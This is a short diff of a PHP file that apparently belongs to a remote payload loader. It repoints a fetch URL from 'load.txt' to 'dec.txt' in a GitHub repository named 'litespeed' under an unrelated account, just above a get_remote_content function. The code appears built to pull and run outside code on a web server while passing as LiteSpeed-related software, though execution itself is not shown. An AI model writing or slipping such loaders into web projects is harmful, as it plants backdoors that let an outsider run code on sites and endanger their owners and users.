@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/load.txt';
+$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/dec.txt';
 
 
 function get_remote_content($url) {
